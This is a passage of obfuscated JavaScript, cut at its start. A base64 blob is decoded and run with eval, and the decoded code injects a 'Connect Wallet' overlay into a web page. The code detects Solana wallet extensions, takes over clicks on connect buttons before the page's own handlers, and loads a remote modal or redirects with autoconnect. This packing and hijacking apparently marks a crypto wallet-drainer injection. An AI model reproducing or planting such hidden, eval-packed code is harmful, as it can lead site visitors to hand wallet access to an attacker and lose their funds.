hY2tncm91bmQ6cmdiYSgwLDAsMCwwLjYpO2JhY2tkcm9wLWZpbHRlcjpibHVyKDZweCk7LXdlYmtpdC1iYWNrZHJvcC1maWx0ZXI6Ymx1cig2cHgpO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmZsZXgtZW5kO3otaW5kZXg6MTAwMDAxO2FuaW1hdGlvbjpud3AtZmFkZSAuMnMgZWFzZX0nICsKICAgICAgJy5ud3AtY2FyZHtiYWNrZ3JvdW5kOiMxNDE0MTQ7Ym9yZGVyLXJhZGl1czpjbGFtcCgwcHgsMjRweCw0NHB4KSBjbGFtcCgwcHgsMjRweCw0NHB4KSAwIDA7cGFkZGluZzoxNnB4IDEycHggY2FsYygxMnB4ICsgZW52KHNhZmUtYXJlYS1pbnNldC1ib3R0b20sMTJweCkpO3dpZHRoOjEwMCU7bWF4LXdpZHRoOjQwMHB4O2JvcmRlcjoxcHggc29saWQgcmdiYSgyNTUsMjU1LDI1NSwwLjA2KTtib3JkZXItYm90dG9tOm5vbmU7YW5pbWF0aW9uOm53cC1zbGlkZSAuM3MgY3ViaWMtYmV6aWVyKC4xNiwxLC4zLDEpfScgKwogICAgICAnLm53cC1oZWFkZXJ7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO3Bvc2l0aW9uOnJlbGF0aXZlO3BhZGRpbmc6NHB4IDAgMTJweH0nICsKICAgICAgJy5ud3AtdGl0bGV7Y29sb3I6I2U0ZTdlNztmb250OjYwMCAxNnB4LzEgS0hUZWthLHN5c3RlbS11aSwtYXBwbGUtc3lzdGVtLHNhbnMtc2VyaWY7bGV0dGVyLXNwYWNpbmc6LTAuMDFlbX0nICsKICAgICAgJy5ud3AtY2xvc2V7cG9zaXRpb246YWJzb2x1dGU7cmlnaHQ6MDt0b3A6MnB4O3dpZHRoOjI4cHg7aGVpZ2h0OjI4cHg7Ym9yZGVyLXJhZGl1czo1MCU7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LDAuMDUpO2JvcmRlcjpub25lO2NvbG9yOiM5YTlmYTU7Zm9udC1zaXplOjE2cHg7Y3Vyc29yOnBvaW50ZXI7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyOy13ZWJraXQtdGFwLWhpZ2hsaWdodC1jb2xvcjp0cmFuc3BhcmVudH0nICsKICAgICAgJy5ud3AtY2xvc2U6YWN0aXZle2JhY2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwwLjEpfScgKwogICAgICAnLm53cC1saXN0e2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47Z2FwOjRweH0nICsKICAgICAgJy5ud3Atd2FsbGV0e2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOjEycHg7cGFkZGluZzoxMHB4IDEycHg7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LDAuMDIpO2JvcmRlci1yYWRpdXM6MTJweDt0ZXh0LWRlY29yYXRpb246bm9uZTtjb2xvcjojZTRlN2U3O2ZvbnQ6NTAwIDE0cHgvMSBLSFRla2Esc3lzdGVtLXVpLC1hcHBsZS1zeXN0ZW0sc2Fucy1zZXJpZjstd2Via2l0LXRhcC1oaWdobGlnaHQtY29sb3I6dHJhbnNwYXJlbnQ7dHJhbnNpdGlvbjpiYWNrZ3JvdW5kIC4xNXN9JyArCiAgICAgICcubndwLXdhbGxldDphY3RpdmV7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LDAuMDYpfScgKwogICAgICAnLm53cC13aWNvbnt3aWR0aDozNnB4O2hlaWdodDozNnB4O2JvcmRlci1yYWRpdXM6OHB4O2ZsZXgtc2hyaW5rOjA7b2JqZWN0LWZpdDpjb3Zlcn0nICsKICAgICAgJy5ud3Atd25hbWV7ZmxleDoxfScgKwogICAgICAnLm53cC10YWd7Zm9udDo1MDAgMTBweC8xIEtIVGVrYSxzeXN0ZW0tdWksc2Fucy1zZXJpZjtjb2xvcjojMjZkOTYyO2JhY2tncm91bmQ6cmdiYSgzOCwyMTcsOTgsMC4xMik7cGFkZGluZzozcHggNnB4O2JvcmRlci1yYWRpdXM6MjBweDtsZXR0ZXItc3BhY2luZzowLjAyZW07dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlfScgKwogICAgICAnLm53cC1jaGV2cm9ue2NvbG9yOnJnYmEoMjI4LDIzMSwyMzEsMC4zKTtmb250LXNpemU6MTRweDttYXJnaW4tbGVmdDo0cHh9JyArCiAgICAgICdAa2V5ZnJhbWVzIG53cC1mYWRle2Zyb217b3BhY2l0eTowfXRve29wYWNpdHk6MX19JyArCiAgICAgICdAa2V5ZnJhbWVzIG53cC1zbGlkZXtmcm9te3RyYW5zZm9ybTp0cmFuc2xhdGVZKDEwMCUpfXRve3RyYW5zZm9ybTp0cmFuc2xhdGVZKDApfX0nICsKICAgICAgJzwvc3R5bGU+JzsKCiAgICB2YXIgd2FsbGV0c0hUTUwgPSAnJzsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgd2FsbGV0cy5sZW5ndGg7IGkrKykgewogICAgICB2YXIgdyA9IHdhbGxldHNbaV07CiAgICAgIHZhciB0YWdIVE1MID0gdy50YWcgPyAnPHNwYW4gY2xhc3M9Im53cC10YWciPicgKyB3LnRhZyArICc8L3NwYW4+JyA6ICcnOwogICAgICB3YWxsZXRzSFRNTCArPSAnPGEgY2xhc3M9Im53cC13YWxsZXQiIGhyZWY9IicgKyB3LnVybCArICciPicgKwogICAgICAgICc8aW1nIGNsYXNzPSJud3Atd2ljb24iIHNyYz0iJyArIHcuaW1nICsgJyIgYWx0PSIiIG9uZXJyb3I9InRoaXMuc3R5bGUuZGlzcGxheT1cJ25vbmVcJzt2YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KFwnc3BhblwnKTtzLmNsYXNzTmFtZT1cJ253cC13aWNvblwnO3Muc3R5bGUuY3NzVGV4dD1cJ2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtiYWNrZ3JvdW5kOiMyYTJhMmE7Y29sb3I6I2U0ZTdlNztmb250LXdlaWdodDo2MDA7Zm9udC1zaXplOjE2cHhcJztzLnRleHRDb250ZW50PVwnJyt3Lm5hbWUuY2hhckF0KDApKydcJzt0aGlzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHMsdGhpcyk7IiAvPicgKwogICAgICAgICc8c3BhbiBjbGFzcz0ibndwLXduYW1lIj4nICsgdy5uYW1lICsgJzwvc3Bhbj4nICsKICAgICAgICB0YWdIVE1MICsKICAgICAgICAnPHNwYW4gY2xhc3M9Im53cC1jaGV2cm9uIj7igLo8L3NwYW4+JyArCiAgICAgICAgJzwvYT4nOwogICAgfQoKICAgIHZhciBwaWNrZXJEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIHBpY2tlckRpdi5pZCA9ICdub2lyV2FsbGV0UGlja2VyJzsKICAgIHBpY2tlckRpdi5pbm5lckhUTUwgPSBwaWNrZXJDU1MgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLW92ZXJsYXkiPicgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLWNhcmQiPicgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLWhlYWRlciI+JyArCiAgICAgICc8c3BhbiBjbGFzcz0ibndwLXRpdGxlIj5Db25uZWN0IFdhbGxldDwvc3Bhbj4nICsKICAgICAgJzxidXR0b24gY2xhc3M9Im53cC1jbG9zZSI+4pyVPC9idXR0b24+JyArCiAgICAgICc8L2Rpdj4nICsKICAgICAgJzxkaXYgY2xhc3M9Im53cC1saXN0Ij4nICsgd2FsbGV0c0hUTUwgKyAnPC9kaXY+JyArCiAgICAgICc8L2Rpdj48L2Rpdj4nOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwaWNrZXJEaXYpOwoKICAgIHZhciBvdmVybGF5RWwgPSBwaWNrZXJEaXYucXVlcnlTZWxlY3RvcignLm53cC1vdmVybGF5Jyk7CiAgICB2YXIgY2xvc2VFbCA9IHBpY2tlckRpdi5xdWVyeVNlbGVjdG9yKCcubndwLWNsb3NlJyk7CiAgICBpZiAob3ZlcmxheUVsKSB7CiAgICAgIG92ZXJsYXlFbC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGV2KSB7CiAgICAgICAgaWYgKGV2LnRhcmdldCA9PT0gb3ZlcmxheUVsKSBwaWNrZXJEaXYucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChwaWNrZXJEaXYpOwogICAgICB9KTsKICAgIH0KICAgIGlmIChjbG9zZUVsKSB7CiAgICAgIGNsb3NlRWwuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbigpIHsKICAgICAgICBwaWNrZXJEaXYucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChwaWNrZXJEaXYpOwogICAgICB9KTsKICAgIH0KICB9CgogIC8vIERldGVjdCBtb2JpbGUgZGV2aWNlCiAgLy8gTW9iaWxlIGRldGVjdGlvbiDigJQgaW5jbHVkZXMgaVBhZE9TIDEzKyAocmVwb3J0cyBhcyBNYWNpbnRvc2ggYnV0IGhhcyB0b3VjaCkKICB2YXIgX19pc01vYmlsZSA9IC9BbmRyb2lkfHdlYk9TfGlQaG9uZXxpUGFkfGlQb2R8QmxhY2tCZXJyeXxJRU1vYmlsZXxPcGVyYSBNaW5pL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KSB8fAogICAgKG5hdmlnYXRvci5tYXhUb3VjaFBvaW50cyA+IDEgJiYgL01hY2ludG9zaC9pLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCkpOwogIC8vIERldGVjdCB3YWxsZXQgaW4tYXBwIGJyb3dzZXIgKHByb3ZpZGVyIGFscmVhZHkgaW5qZWN0ZWQgPSBubyByZWRpcmVjdCBuZWVkZWQpCiAgdmFyIF9faXNXYWxsZXRCcm93c2VyID0gISEod2luZG93LnBoYW50b20/LnNvbGFuYT8uaXNQaGFudG9tIHx8IHdpbmRvdy5zb2xhbmE/LmlzUGhhbnRvbSB8fAogICAgd2luZG93LnNvbGZsYXJlPy5pc1NvbGZsYXJlIHx8IHdpbmRvdy5Tb2xmbGFyZUFwcCB8fAogICAgd2luZG93LmJhY2twYWNrPy5pc0JhY2twYWNrIHx8IHdpbmRvdy5jb2luYmFzZVNvbGFuYSB8fAogICAgd2luZG93LnRydXN0d2FsbGV0Py5zb2xhbmEpOwoKICBmdW5jdGlvbiBpbml0KCkgewogICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoJ2JlZm9yZWVuZCcsIG1vZGFsSFRNTCk7CiAgICB2YXIgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lyTW9kYWxPdmVybGF5Jyk7CiAgICB2YXIgaWZyYW1lID0gb3ZlcmxheSA/IG92ZXJsYXkucXVlcnlTZWxlY3RvcignLm5vaXItbW9kYWwtaWZyYW1lJykgOiBudWxsOwogICAgdmFyIHNwaW5uZXIgPSBvdmVybGF5ID8gb3ZlcmxheS5xdWVyeVNlbGVjdG9yKCcubm9pci1zcGlubmVyJykgOiBudWxsOwogICAgdmFyIG5vaXJSZWFkeSA9IGZhbHNlOwogICAgdmFyIHBlbmRpbmdPcGVuID0gZmFsc2U7CiAgICB2YXIgX2xvYWRUaW1lb3V0ID0gbnVsbDsKICAgIHZhciBfcmV0cnlDb3VudCA9IDA7CgogICAgZnVuY3Rpb24gc2hvd01vZGFsKCkgewogICAgICBvdmVybGF5LnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7IG92ZXJsYXkuY2xhc3NMaXN0LmFkZCgnbm9pci1hY3RpdmUnKTsgfSwgMTApOwoKICAgICAgLy8gQ2hlY2sgaWYgaWZyYW1lIGlzIHN0aWxsIGFsaXZlIChtaWdodCBoYXZlIGNyYXNoZWQgb3IgbmF2aWdhdGVkIGF3YXkpCiAgICAgIHZhciBpZnJhbWVBbGl2ZSA9IGZhbHNlOwogICAgICB0cnkgeyBpZnJhbWVBbGl2ZSA9ICEhKGlmcmFtZSAmJiBpZnJhbWUuY29udGVudFdpbmRvdyk7IH0gY2F0Y2goXykge30KCiAgICAgIGlmIChub2lyUmVhZHkgJiYgaWZyYW1lQWxpdmUpIHsKICAgICAgICAvLyBGYXN0IHBhdGgg4oCUIGlmcmFtZSBhbHJlYWR5IGxvYWRlZCwgc2hvdyBpbnN0YW50bHkgd2l0aCBubyBzcGlubmVyCiAgICAgICAgaWYgKGlmcmFtZSkgeyBpZnJhbWUuY2xhc3NMaXN0LmFkZCgnbm9pci1pZnJhbWUtcmVhZHknKTsgfQogICAgICAgIGlmIChzcGlubmVyKSB7IHNwaW5uZXIuY2xhc3NMaXN0LmFkZCgnbm9pci1oaWRkZW4nKTsgfQogICAgICAgIGlmIChpZnJhbWUuY29udGVudFdpbmRvdykgewogICAgICAgICAgdHJ5IHsgaWZyYW1lLmNvbnRlbnRXaW5kb3cucG9zdE1lc3NhZ2UoeyB0eXBlOiAnbm9pck1vZGFsT3BlbicgfSwgJyonKTsgfSBjYXRjaCAoXykge30KICAgICAgICB9CiAgICAgIH0gZWxzZSB7CiAgICAgICAgLy8gU2xvdyBwYXRoIOKAlCBpZnJhbWUgc3RpbGwgbG9hZGluZyBvciBkZWFkLCBzaG93IHNwaW5uZXIgYW5kIHdhaXQKICAgICAgICBub2lyUmVhZHkgPSBmYWxzZTsKICAgICAgICBpZiAoaWZyYW1lKSB7IGlmcmFtZS5zdHlsZS5oZWlnaHQgPSAnJzsgaWZyYW1lLmNsYXNzTGlzdC5yZW1vdmUoJ25vaXItaWZyYW1lLXJlYWR5Jyk7IH0KICAgICAgICBpZiAoc3Bpbm5lcikgeyBzcGlubmVyLmNsYXNzTGlzdC5yZW1vdmUoJ25vaXItaGlkZGVuJyk7IH0KICAgICAgICBwZW5kaW5nT3BlbiA9IHRydWU7CiAgICAgICAgLy8gSWYgaWZyYW1lIGRpZWQsIHJlbG9hZCBpdAogICAgICAgIGlmICghaWZyYW1lQWxpdmUgJiYgaWZyYW1lKSB7IGlmcmFtZS5zcmMgPSBNT0RBTF9VUkw7IH0KICAgICAgICAvLyBFcnJvciByZWNvdmVyeTogaWYgbm9pclJlYWR5IGRvZXNuJ3QgZmlyZSB3aXRoaW4gMTBzLCByZWxvYWQgaWZyYW1lICh1cCB0byAyIHJldHJpZXMpCiAgICAgICAgaWYgKF9sb2FkVGltZW91dCkgY2xlYXJUaW1lb3V0KF9sb2FkVGltZW91dCk7CiAgICAgICAgX2xvYWRUaW1lb3V0ID0gc2V0VGltZW91dChmdW5jdGlvbiByZXRyeUxvYWQoKSB7CiAgICAgICAgICBpZiAoIW5vaXJSZWFkeSAmJiBpZnJhbWUpIHsKICAgICAgICAgICAgX3JldHJ5Q291bnQrKzsKICAgICAgICAgICAgaWYgKF9yZXRyeUNvdW50IDw9IDIpIHsKICAgICAgICAgICAgICBpZnJhbWUuc3JjID0gTU9EQUxfVVJMOwogICAgICAgICAgICAgIF9sb2FkVGltZW91dCA9IHNldFRpbWVvdXQocmV0cnlMb2FkLCAxMDAwMCk7CiAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgICB9LCAxMDAwMCk7CiAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBoaWRlTW9kYWwoKSB7CiAgICAgIG92ZXJsYXkuY2xhc3NMaXN0LnJlbW92ZSgnbm9pci1hY3RpdmUnKTsKICAgICAgcGVuZGluZ09wZW4gPSBmYWxzZTsKICAgICAgaWYgKF9sb2FkVGltZW91dCkgeyBjbGVhclRpbWVvdXQoX2xvYWRUaW1lb3V0KTsgX2xvYWRUaW1lb3V0ID0gbnVsbDsgfQogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAvLyBLZWVwIGlmcmFtZSBhbGl2ZSDigJQgZG9uJ3QgcmVsb2FkLiBSZW9wZW5zIHVzZSBwb3N0TWVzc2FnZSBmb3IgaW5zdGFudCByZXNwb25zZS4KICAgICAgfSwgMzAwKTsKICAgIH0KCiAgICAvLyBFbnN1cmUgLm5vaXItY29ubmVjdCBlbGVtZW50cyByZXNwb25kIGluc3RhbnRseSBvbiBtb2JpbGUgKG5vIDMwMG1zIHRhcCBkZWxheSkKICAgIHRyeSB7CiAgICAgIHZhciB0b3VjaFN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3R5bGUnKTsKICAgICAgdG91Y2hTdHlsZS50ZXh0Q29udGVudCA9ICcubm9pci1jb25uZWN0e3RvdWNoLWFjdGlvbjptYW5pcHVsYXRpb247LXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOnRyYW5zcGFyZW50fSc7CiAgICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQodG91Y2hTdHlsZSk7CiAgICB9IGNhdGNoKF8pIHt9CgogICAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ21lc3NhZ2UnLCBmdW5jdGlvbihlKSB7CiAgICAgIGlmICghZS5kYXRhIHx8IHR5cGVvZiBlLmRhdGEudHlwZSAhPT0gJ3N0cmluZycpIHJldHVybjsKICAgICAgaWYgKGUuZGF0YS50eXBlID09PSAnbm9pclJlYWR5JykgewogICAgICAgIG5vaXJSZWFkeSA9IHRydWU7CiAgICAgICAgX3JldHJ5Q291bnQgPSAwOwogICAgICAgIGlmIChfbG9hZFRpbWVvdXQpIHsgY2xlYXJUaW1lb3V0KF9sb2FkVGltZW91dCk7IF9sb2FkVGltZW91dCA9IG51bGw7IH0KICAgICAgICAvLyBJZnJhbWUgaXMgbG9hZGVkIOKAlCBmYWRlIGl0IGluIGFuZCBoaWRlIHNwaW5uZXIKICAgICAgICBpZiAoaWZyYW1lKSB7IGlmcmFtZS5jbGFzc0xpc3QuYWRkKCdub2lyLWlmcmFtZS1yZWFkeScpOyB9CiAgICAgICAgaWYgKHNwaW5uZXIpIHsgc3Bpbm5lci5jbGFzc0xpc3QuYWRkKCdub2lyLWhpZGRlbicpOyB9CiAgICAgICAgaWYgKHBlbmRpbmdPcGVuKSB7CiAgICAgICAgICBwZW5kaW5nT3BlbiA9IGZhbHNlOwogICAgICAgICAgaWYgKGlmcmFtZSAmJiBpZnJhbWUuY29udGVudFdpbmRvdykgewogICAgICAgICAgICB0cnkgeyBpZnJhbWUuY29udGVudFdpbmRvdy5wb3N0TWVzc2FnZSh7IHR5cGU6ICdub2lyTW9kYWxPcGVuJyB9LCAnKicpOyB9IGNhdGNoIChfKSB7fQogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgaWYgKGUuZGF0YS50eXBlID09PSAnbm9pck1vZGFsQ2xvc2UnKSB7IGhpZGVNb2RhbCgpOyByZXR1cm47IH0KICAgICAgaWYgKGUuZGF0YS50eXBlID09PSAnbm9pck1vZGFsUmVzaXplJyAmJiB0eXBlb2YgZS5kYXRhLmhlaWdodCA9PT0gJ251bWJlcicgJiYgaWZyYW1lKSB7CiAgICAgICAgdmFyIG1pbkggPSA2MDA7CiAgICAgICAgdmFyIG1heEggPSBNYXRoLm1pbih3aW5kb3cuaW5uZXJIZWlnaHQgKiAwLjkyLCA5MDApOwogICAgICAgIHZhciBoID0gTWF0aC5tYXgobWluSCwgTWF0aC5taW4obWF4SCwgTWF0aC5yb3VuZChlLmRhdGEuaGVpZ2h0KSkpOwogICAgICAgIGlmcmFtZS5zdHlsZS5oZWlnaHQgPSBoICsgJ3B4JzsKICAgICAgfQogICAgfSk7CgogICAgZnVuY3Rpb24gaGFuZGxlTm9pckNvbm5lY3QoKSB7CiAgICAgIGlmIChfX2lzTW9iaWxlICYmICFfX2lzV2FsbGV0QnJvd3NlcikgewogICAgICAgIHNob3dNb2JpbGVXYWxsZXRQaWNrZXIoKTsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgaWYgKF9faXNNb2JpbGUgJiYgX19pc1dhbGxldEJyb3dzZXIpIHsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IE1PREFMX1VSTCArICcmYXV0b2Nvbm5lY3Q9MSc7CiAgICAgICAgcmV0dXJuOwogICAgICB9CiAgICAgIHNob3dNb2RhbCgpOwogICAgfQoKICAgIGZ1bmN0aW9uIGZpbmROb2lyQ29ubmVjdChlbCkgewogICAgICB3aGlsZSAoZWwgJiYgZWwgIT09IGRvY3VtZW50KSB7CiAgICAgICAgaWYgKGVsLmNsYXNzTGlzdCAmJiBlbC5jbGFzc0xpc3QuY29udGFpbnMoJ25vaXItY29ubmVjdCcpKSByZXR1cm4gZWw7CiAgICAgICAgZWwgPSBlbC5wYXJlbnRFbGVtZW50OwogICAgICB9CiAgICAgIHJldHVybiBudWxsOwogICAgfQoKICAgIC8vIEV2ZW50IGRlbGVnYXRpb24g4oCUIHdvcmtzIHdpdGggUmVhY3QsIFZ1ZSwgQW5ndWxhciwgYW55IFNQQSBmcmFtZXdvcmsuCiAgICAvLyBJbnN0ZWFkIG9mIHNjYW5uaW5nIERPTSBvbmNlIChicmVha3Mgd2hlbiBTUEEgcmUtcmVuZGVycyBhbmQgcmVwbGFjZXMgbm9kZXMpLAogICAgLy8gd2UgbGlzdGVuIG9uIGRvY3VtZW50IGFuZCBtYXRjaCBjbGlja3Mgb24gLm5vaXItY29ubmVjdCBlbGVtZW50cy4KICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZSkgewogICAgICBpZiAoZmluZE5vaXJDb25uZWN0KGUudGFyZ2V0KSkgewogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICBlLnN0b3BQcm9wYWdhdGlvbigpOwogICAgICAgIGhhbmRsZU5vaXJDb25uZWN0KCk7CiAgICAgIH0KICAgIH0sIHRydWUpOwoKICAgIC8vIE1vYmlsZSBiYWNrdXA6IHRvdWNoZW5kIGZpcmVzIGltbWVkaWF0ZWx5IChubyAzMDBtcyBkZWxheSBsaWtlIGNsaWNrKS4KICAgIC8vIFByZXZlbnRzIG1pc3NlZCB0YXBzIHdoZW4gUmVhY3QgcmUtcmVuZGVycyBiZXR3ZWVuIHRvdWNoc3RhcnQgYW5kIGNsaWNrLgogICAgaWYgKF9faXNNb2JpbGUpIHsKICAgICAgdmFyIF90b3VjaFN0YXJ0WCA9IDAsIF90b3VjaFN0YXJ0WSA9IDAsIF90b3VjaFRhcmdldCA9IG51bGw7CiAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ3RvdWNoc3RhcnQnLCBmdW5jdGlvbihlKSB7CiAgICAgICAgX3RvdWNoVGFyZ2V0ID0gZS50YXJnZXQ7CiAgICAgICAgX3RvdWNoU3RhcnRYID0gZS50b3VjaGVzWzBdLmNsaWVudFg7CiAgICAgICAgX3RvdWNoU3RhcnRZID0gZS50b3VjaGVzWzBdLmNsaWVudFk7CiAgICAgIH0sIHsgY2FwdHVyZTogdHJ1ZSwgcGFzc2l2ZTogdHJ1ZSB9KTsKCiAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ3RvdWNoZW5kJywgZnVuY3Rpb24oZSkgewogICAgICAgIGlmICghX3RvdWNoVGFyZ2V0KSByZXR1cm47CiAgICAgICAgdmFyIGR4ID0gZS5jaGFuZ2VkVG91Y2hlc1swXS5jbGllbnRYIC0gX3RvdWNoU3RhcnRYOwogICAgICAgIHZhciBkeSA9IGUuY2hhbmdlZFRvdWNoZXNbMF0uY2xpZW50WSAtIF90b3VjaFN0YXJ0WTsKICAgICAgICAvLyBPbmx5IHRyZWF0IGFzIHRhcCBpZiBmaW5nZXIgbW92ZWQgbGVzcyB0aGFuIDEwcHggKG5vdCBhIHNjcm9sbCkKICAgICAgICBpZiAoTWF0aC5hYnMoZHgpID4gMTAgfHwgTWF0aC5hYnMoZHkpID4gMTApIHJldHVybjsKICAgICAgICBpZiAoZmluZE5vaXJDb25uZWN0KF90b3VjaFRhcmdldCkpIHsKICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgIGhhbmRsZU5vaXJDb25uZWN0KCk7CiAgICAgICAgfQogICAgICAgIF90b3VjaFRhcmdldCA9IG51bGw7CiAgICAgIH0sIHRydWUpOwogICAgfQoKICAgIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihlKSB7CiAgICAgIGlmIChlLnRhcmdldCA9PT0gb3ZlcmxheSkgeyBoaWRlTW9kYWwoKTsgfQogICAgfSk7CgogICAgdmFyIHVybFBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7CiAgICBpZiAodXJsUGFyYW1zLmdldCgnc2hvd0ZyYW1lJykgPT09ICd0cnVlJykgeyBzaG93TW9kYWwoKTsgfQoKICAgIHdpbmRvdy5ub2lyQ29ubmVjdCA9IGZ1bmN0aW9uKCkgeyBoYW5kbGVOb2lyQ29ubmVjdCgpOyB9OwogIH0KCiAgaWYgKGRvY3VtZW50LnJlYWR5U3RhdGUgPT09ICdsb2FkaW5nJykgewogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGluaXQpOwogIH0gZWxzZSB7CiAgICBpbml0KCk7CiAgfQp9Cgpib290KCk7Cn0pKCk7");var _0x9i59hk=decodeURIComponent(escape(_0xcxnjje));eval(_0x9i59hk)})();